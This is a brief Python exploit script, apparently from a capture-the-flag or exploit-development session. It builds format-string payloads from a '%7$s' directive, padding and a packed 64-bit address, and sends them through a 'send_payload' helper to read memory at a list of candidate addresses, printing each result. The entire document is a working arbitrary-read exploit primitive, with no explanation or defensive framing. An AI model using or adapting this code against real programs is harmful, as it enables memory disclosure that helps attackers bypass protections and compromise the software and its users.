import struct
from mirage import send_payload

def deref(addr, slot=7):
    a = struct.pack("<Q", addr)
    directive = ("%%%d$s" % slot).encode()
    pad = b"A" * (8 - len(directive))
    payload = directive + pad + a + b"\n"
    b, r = send_payload(payload, wait=2)
    return r

candidates = [0x4bc260, 0x4bc250, 0x4a3500, 0x4a3560, 0x4b0a00, 0x4bca80, 0x4bca90, 0x4b6ac0, 0x4b5140]
for c in candidates:
    r = deref(c)
    print(hex(c), "->", r)
